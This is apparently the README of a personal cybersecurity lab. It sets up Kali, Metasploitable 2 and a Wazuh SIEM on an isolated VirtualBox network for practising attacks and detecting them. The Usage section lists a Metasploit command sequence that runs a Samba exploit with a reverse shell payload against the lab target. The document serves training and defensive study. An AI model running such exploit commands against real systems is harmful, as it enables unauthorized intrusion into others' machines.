# Cybersecurity Home Lab

A self-built offensive and defensive security lab simulating a real attack-detect-document cycle, running entirely on a personal machine with VirtualBox, Kali Linux, Metasploitable 2, and Wazuh SIEM.

---

## Overview

This project exists to practice two things at once: breaking into a system the way a real attacker would, and detecting that same attack the way a SOC analyst would. Every exploit in this repo was actually executed, captured on the network wire with Wireshark, checked against Wazuh's SIEM alerts, and written up with the underlying CVE and the fix that should have prevented it.

The goal is a working portfolio for a SOC / Blue Team role — not a checklist of commands run once, but a repeatable lab environment with real documentation behind every attack.

---

## Features

- Isolated three-VM network simulating an attacker, a vulnerable target, and a monitoring server
- Five documented exploitation techniques against Metasploitable 2, each mapped to a CVE and MITRE ATT&CK technique
- Live SIEM monitoring via Wazuh, with an agent on the attacker machine logging every command and privilege escalation
- Packet-level traffic analysis in Wireshark, including the exploit payload and post-exploitation session captured in plaintext
- Post-exploitation walkthrough covering credential harvesting, persistence, lateral movement recon, and log tampering
- Every attack documented with exact commands, screenshots, root cause explanation, and remediation steps

---

## Architecture

Three virtual machines on a shared, isolated VirtualBox NAT Network (**Cyberlab**, `10.0.2.0/24`):

| Machine | Role | IP | RAM |
|---|---|---|---|
| Kali Linux 2025.3 | Attacker | 10.0.2.15 | 3GB |
| Metasploitable 2 | Vulnerable target | 10.0.2.3 | 1GB |
| Wazuh v4.14.5 | SIEM / monitoring server | 10.0.2.4 | 6GB |

Kali runs an active Wazuh agent (`kali-attacker`), so every command, login, and sudo escalation on the attacker machine is logged and shipped to the SIEM in real time.

The Wazuh VM has a second, host-only network adapter so its web dashboard is reachable from the Windows host browser at `https://192.168.56.101`, separate from the internal `10.0.2.0/24` lab network.

Metasploitable 2 runs Ubuntu 8.04, which is too old to support a modern Wazuh agent. This means detection coverage in this repo is currently one-sided — visible from the attacker's machine, not the victim's. That gap is the reason Phase 4 exists.

---

## Technologies Used

| Category | Tool |
|---|---|
| Hypervisor | Oracle VirtualBox |
| Attacker OS | Kali Linux |
| Vulnerable target | Metasploitable 2 |
| SIEM | Wazuh |
| Port/service scanning | nmap |
| Exploitation | Metasploit Framework |
| Credential brute forcing | Hydra |
| Packet capture and analysis | Wireshark |
| Offline hash cracking | John the Ripper |

---

## Installation & Setup

1. Install VirtualBox on the host machine
2. Create a NAT Network named `Cyberlab` with subnet `10.0.2.0/24` and DHCP enabled, under VirtualBox's Network Manager
3. Import Kali Linux and attach its network adapter to `Cyberlab`
4. Download the Metasploitable 2 VMDK and create a VM pointing to the existing disk, with its adapter also on `Cyberlab`
5. Import the Wazuh OVA with at least 6GB RAM allocated, attach its first adapter to `Cyberlab`, and add a second host-only adapter so the dashboard is reachable from the host browser
6. Register Kali as a Wazuh agent from the dashboard under Agents Management, using the generated install command on the Kali terminal
7. Take a clean snapshot of each VM once networking is confirmed working, before running any attacks

Full step-by-step setup, including every networking issue that came up and how it was fixed, is in `phase1-setup/notes.md`.

---

## Usage

Each attack lives in its own file under `phase2-attacks/`, with the exact commands used, what happened, and a screenshot of the result.

**Example — exploiting the Samba vulnerability:**

msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.0.2.3
set PAYLOAD cmd/unix/reverse
set LHOST 10.0.2.15
run


Detection for each attack is cross-checked against the Wazuh dashboard under **Threat Hunting → Events**, filtered by `agent.name: Kali-attacker`, and documented in `phase3-detection/`.

---

## Project Structure

Cysec_homelab/
├── README.md
│
├── phase1-setup/
│ └── notes.md Lab architecture, hardware, and every
│ networking issue hit during setup
│
├── phase2-attacks/
│ ├── notes.md Attack index and key findings
│ ├── 01-nmap-recon.md
│ ├── 02-samba-exploit.md
│ ├── 03-hydra-bruteforce.md
│ ├── 04-post-exploitation.md
│ ├── 05-vsftpd-exploit.md
│ └── screenshots (.png) One per attack, referenced inline
│
└── phase3-detection/
├── notes.md Wazuh detection log per attack
├── 02-wireshark-analysis.md
└── screenshots (.png)


---

## Security Considerations

- The entire lab runs on an isolated VirtualBox NAT Network with no bridge to the host's real network or the internet, so nothing here touches anything outside the lab
- All target machines are intentionally vulnerable software built for this purpose (Metasploitable 2) — no real or third-party systems are targeted
- Detection coverage is currently limited to the attacker side only, since Metasploitable's OS is too old to run a modern SIEM agent; this limitation is documented rather than hidden
- Credentials, backdoor accounts, and exploit payloads used in this lab exist only inside isolated VMs and are reset via snapshots between sessions

---

## Future Improvements

- **Phase 4:** Active Directory lab with a Windows Server 2019 Domain Controller and a domain-joined Windows 10 workstation, both connected as Wazuh agents for full two-sided detection
- Kerberoasting, Pass-the-Hash, and BloodHound-based AD enumeration once Phase 4 is live
- Digital forensics workflow using Autopsy — disk imaging and deleted file recovery
- Explore agentless or network-level monitoring (e.g. Suricata) to cover legacy targets a standard agent can't support

---

## Author & License

Built and maintained by **Anubhab**, as part of ongoing preparation for a SOC / Blue Team role.

This repository is for educational purposes only. All attacks were performed exclusively against intentionally vulnerable systems inside an isolated personal lab.

LinkedIn: https://www.linkedin.com/in/anubhabcysec
